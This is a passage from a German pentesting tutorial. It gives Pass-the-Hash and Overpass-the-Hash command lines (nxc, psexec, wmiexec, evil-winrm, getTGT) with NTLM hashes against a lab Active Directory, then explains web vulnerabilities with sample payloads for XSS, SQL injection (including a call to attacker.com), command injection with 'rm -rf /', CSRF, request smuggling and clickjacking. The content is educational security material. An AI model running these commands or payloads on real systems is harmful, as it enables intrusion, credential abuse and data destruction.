Beim **Pass-the-Hash Angriff** wird der NTLM-Hash eines Benutzerkontos verwendet, um eine Authentifizierung zu initiieren, ohne das eigentliche Passwort zu kennen. Dies ist besonders effektiv in Umgebungen, in denen noch NTLM für die Authentifizierung verwendet wird. Tools wie **Mimikatz** ermöglichen es, die Hashes aus dem Speicher eines kompromittierten Rechners zu extrahieren. Mit diesem Hash kann der Angreifer sich dann im gesamten Netzwerk authentifizieren und lateral bewegen, ohne das Passwort im Klartext zu benötigen.
```shell
nxc smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth
nxc smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'

psexec -hashes 'cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11

wmiexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11

smbexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11

atexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11

dcomexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11

nxc smb 192.168.56.11 -H ':cba36eccfd9d949c73bc73715364aff5' -d 'north' -u 'catelyn.stark' -x whoami

evil-winrm -i 192.168.56.11 -u catelyn.stark -H 'cba36eccfd9d949c73bc73715364aff5'
```

### OverPass-the-Hash Angriff
Beim Overpass-the-Hash Angriff (auch als Pass-the-Key bekannt) wird anstelle des NTLM-Hashes ein Kerberos-Schlüssel (in der Regel der NTLM-Hash) genutzt, um ein Kerberos-Ticket zu generieren und sich im Netzwerk zu authentifizieren. Dieser Angriff wird möglich, wenn der Angreifer Zugriff auf den NTLM-Hash eines Benutzerkontos hat und diesen verwendet, um TGTs (Ticket Granting Tickets) in einer Kerberos-Umgebung zu erzeugen. Tools wie Rubeus oder Mimikatz unterstützen die Durchführung dieses Angriffs, indem sie den NTLM-Hash in ein gültiges Kerberos-Ticket umwandeln. Dies ermöglicht eine Authentifizierung im Netzwerk auf Kerberos-Level und ermöglicht eine potenziell noch weitergehende laterale Bewegung, da Kerberos in modernen Netzwerken bevorzugt wird
```shell
getTGT.py -hashes ':cba36eccfd9d949c73bc73715364aff5' north.sevenkingdoms.local/catelyn.stark
export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache
wmiexec.py -k -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell
```


# Web Pentesting

In diesem Kapitel werden wir uns mit Web Pentesting beschäftigen. Zuerst befassen wir uns mit den Grundlagen der Funktionsweise des modernen Webs.

## Grundlagen des Webs
Das Web besteht in einem vereinfachten Modell aus zwei Hauptkomponenten: dem **Client** und dem **Server**.

- Der **Client** (z.B. unser PC) wird vom Benutzer gesteuert. Er sendet Anfragen an eine bestimmte Adresse, die der Browser in ein HTTP-konformes Format konvertiert und an den Server sendet.
- Der **Server** verarbeitet die Anfrage, führt programmierte Aktionen aus, verändert oder sucht Daten und sendet eine HTTP-Antwort zurück an den Client. Der Browser des Clients rendert diese Antwort dann für den Benutzer sichtbar.

Fast jede Interaktion im Web basiert auf diesem Prinzip: Der Client sendet Anfragen für Ressourcen, der Server verarbeitet sie und sendet die Antworten zurück.

### Inhalt einer HTTP-Anfrage
HTTP-Anfragen sind strukturiert und bestehen aus folgenden Teilen:

- **Methode**: Gibt die Art der Anfrage an (z.B. `GET` zum Abrufen von Daten, `POST` zum Senden und Verarbeiten von Daten).
- **Pfad**: Gibt den Pfad der Ressource an (z.B. `/`, `/users`).
- **Protokollversion**: Gibt die verwendete HTTP-Version an (z.B. HTTP/1.1).
- **Header**: Enthalten zusätzliche Informationen wie den Host, akzeptierte Sprachen, Cookies usw.

Die Antwort des Servers enthält ebenfalls:

- **Protokollversion** und **Statuscode** (z.B. `200 OK` für Erfolg, `400 Bad Request` für Client-Fehler, `500 Internal Server Error` für Server-Fehler).
- **Header**: Informationen wie `Content-Type`, `Cache-Control` und Cookies.
- Beide Teile (Anfrage und Antwort) können zusätzlich einen **Body** mit Daten enthalten, z.B. JSON-Daten oder Dateien.

## Aufbau einer Web-Applikation
In der Realität sind Webanwendungen weitaus komplexer als das vereinfachte Client-Server-Modell. Ein typischer Aufbau umfasst:

- **Benutzer-Browser**: Das zentrale Element, das Anfragen an den DNS-Server sendet.
- **DNS-Server**: Übersetzt Domainnamen in IP-Adressen.
- **Load Balancer**: Verteilt Anfragen auf mehrere Webserver.
- **Webserver**: Verarbeiten die HTTP-Anfragen und interagieren mit Datenbanken oder Caching-Systemen.
- **Datenbank**: Speichert die Daten der Anwendung (z.B. SQL oder NoSQL).
- **Caching-System**: Speichert häufig abgerufene Daten, um die Leistung zu verbessern.
- **Job-Server**: Führen asynchrone Aufgaben aus.
- **Cloud Storage**: Speichert Daten langfristig.
- **CDN (Content Delivery Network)**: Liefert statische Inhalte schnell aus.
- **Data Warehouse**: Speichert große Datenmengen für Analysen.

Diese vielschichtige Architektur bietet zahlreiche Angriffspunkte für das Pentesting.

## Häufige Angriffsarten
Die Möglichkeit, Systeme zu steuern und eigene Eingaben vorzunehmen, birgt das inhärente Risiko potenzieller Angriffsvektoren. Im Folgenden werden die gebräuchlichsten Schwachstellen in Bezug auf Webanwendungen und Systeminteraktionen auf einem detaillierten Niveau analysiert.

### Cross-Site Scripting (XSS)
Cross-Site Scripting (XSS) bezeichnet eine Kategorie von Schwachstellen, die es einem Angreifer ermöglichen, schädlichen JavaScript-Code in die Webseite eines anderen Nutzers einzuschleusen. Dies kann zur Kompromittierung von Sitzungsdaten, zur Manipulation von Benutzerinteraktionen oder zur Anzeige von betrügerischen Inhalten genutzt werden. XSS ist in drei Hauptarten untergliedert:

1. **Stored XSS**: Der schädliche Code wird persistent auf dem Server gespeichert, etwa in einer Datenbank. Jedes Mal, wenn ein anderer Nutzer die betroffene Seite aufruft, wird dieser Code automatisch ausgeführt, ohne dass eine weitere Interaktion des Angreifers erforderlich ist. Dies tritt oft in Bereichen auf, die Benutzereingaben persistieren, wie etwa Kommentarfelder oder Benutzerprofilbeschreibungen.
   ```javascript
   // Beispiel: Ein gespeicherter Kommentar, der schädliches JavaScript enthält
   <script>alert('Stored XSS!');</script>
   ```

2. **Reflected XSS**: Bei Reflected XSS wird der schädliche Code dynamisch über eine URL als Parameter an den Server gesendet und direkt an den Benutzer zurückgegeben. Dieser Typ von XSS tritt häufig auf, wenn Benutzereingaben wie Suchanfragen ohne ausreichende Validierung in die HTML-Antwort eingebettet werden.
   ```html
   <!-- Beispiel-URL -->
   https://example.com/search?q=<script>alert('Reflected XSS');</script>
   ```

3. **DOM-based XSS**: Dieser Angriffstyp erfolgt direkt im Document Object Model (DOM) der Webseite, d.h. die schädlichen Manipulationen finden auf der Client-Seite statt, ohne eine Interaktion mit dem Server. Hierbei wird die unsichere Benutzereingabe in den DOM-Baum eingebettet, was schädlichen Code zur Ausführung bringt.
   ```javascript
   // Beispiel: Unsichere Manipulation des DOM
   var userInput = location.hash.substring(1);
   document.getElementById('output').innerHTML = userInput;
   // Bei Eingabe von: https://example.com/#<script>alert('DOM XSS');</script>
   ```

### SQL Injection (SQLI)
SQL Injection ermöglicht es einem Angreifer, bestehende SQL-Queries durch manipulierte Eingaben zu verändern, um vertrauliche Daten zu exfiltrieren, unberechtigten Zugriff zu erhalten oder Daten zu verändern. SQLI wird im Allgemeinen in drei Typen kategorisiert:

1. **In-Band SQLI**: Der manipulierte SQL-Befehl wird direkt in der Antwort angezeigt, wodurch der Angreifer sofort Feedback über den Erfolg seiner Eingabe erhält. Dies wird oft verwendet, um Authentifizierung zu umgehen oder vertrauliche Informationen auszulesen.
   ```sql
   SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
   ```

2. **Inferential SQLI (Blind SQLI)**: Bei diesem Typ gibt es keinen direkten Output, aber der Angreifer kann durch boolesche Ausdrücke oder Timing-Manipulationen Informationen über das Verhalten des Systems ableiten.
   ```sql
   -- Zeitbasierter Angriff
   SELECT IF(1=1, SLEEP(5), null);
   -- Die Antwort verzögert sich um 5 Sekunden, wenn die Bedingung wahr ist
   ```

3. **Out-of-Band SQLI**: Hierbei erhält der Angreifer die Daten über einen externen Kanal. Dies geschieht beispielsweise durch die Manipulation eines Servers, um über HTTP eine Anfrage an einen externen Endpunkt zu senden.
   ```sql
   SELECT load_file('\\attacker.com\payload');
   ```

### Command Injection
Command Injection beschreibt Angriffe, bei denen ein Angreifer unsichere Eingaben verwendet, um systemeigene Befehle auf dem Server auszuführen. Durch mangelnde Validierung können systemkritische Funktionen manipuliert werden, was zur Kompromittierung des gesamten Systems führen kann.
```python
import os

# Unsichere Eingabe, die direkt in eine Systemfunktion übernommen wird
user_input = "test.txt; rm -rf /"
os.system(f"cat {user_input}")
# Der Angreifer könnte hier durch Eingabe von "test.txt; rm -rf /" schädlichen Code ausführen
```

### Insecure Direct Object Reference (IDOR)
IDOR-Schwachstellen treten auf, wenn ein System den direkten Zugriff auf Objekte basierend auf Benutzeridentifikatoren wie IDs ermöglicht, ohne zu prüfen, ob der Benutzer berechtigt ist, auf die angeforderte Ressource zuzugreifen. Diese Art von Schwachstelle kann dazu verwendet werden, auf vertrauliche Daten anderer Benutzer zuzugreifen.
```http
GET /user/12345/profile
# Ein Angreifer ändert die ID auf /user/12346/profile und erhält damit unberechtigt Zugriff auf fremde Daten
```

### Cross-Site Request Forgery (CSRF)
CSRF-Angriffe zwingen authentifizierte Benutzer dazu, ungewollte Aktionen auf einer vertrauenswürdigen Webseite auszuführen, indem der Angreifer eine Anfrage initiiert, die im Kontext der laufenden Benutzer-Session ausgeführt wird. Dies geschieht durch die Ausnutzung der Browser-Logik, die Cookies automatisch für jede Anfrage an den entsprechenden Server sendet.
```html
<!-- Beispiel: CSRF-Formular, das im Hintergrund Geld überweist -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to_account" value="attacker_account">
</form>
<script>
document.forms[0].submit();
</script>
```

### HTTP Request Smuggling
HTTP Request Smuggling ist eine raffinierte Angriffstechnik, bei der eine speziell konstruierte HTTP-Anfrage verwendet wird, um unterschiedliche Interpretationen zwischen verschiedenen Proxy- oder Backend-Systemen zu erzwingen. Dies kann zu einer Manipulation der Anfragen anderer Benutzer oder zur Umgehung von Sicherheitsmechanismen führen.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0

POST /malicious HTTP/1.1
Content-Length: 0

```

### Clickjacking
Clickjacking ist ein Angriff, bei dem eine legitime Seite innerhalb eines unsichtbaren `iframe` eingebettet wird. Der Benutzer wird dazu verleitet, Aktionen durchzuführen, die er nicht beabsichtigt, da er glaubt, eine andere legitime Schaltfläche oder ein Interface-Element zu betätigen.
```html
<!-- Unsichtbarer iframe, der eine schädliche Seite überdeckt -->
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
<button onclick="executeAttack()">Klicken Sie hier für einen Preis!</button>
```

Diese Angriffe sind weitverbreitet und oft sehr effektiv, insbesondere wenn keine umfassenden Sicherheitsvorkehrungen getroffen werden. Angemessene Abwehrmaßnahmen umfassen strikte Input-Validierung, den Einsatz sicherer Codierungspraktiken und die Verwendung von Sicherheitsmechanismen wie CSRF-Tokens, Content Security Policy (CSP), sowie eine Vielzahl weiterer Schutzmechanismen, um die Angriffsfläche zu minimieren und Systeme proaktiv zu schützen.

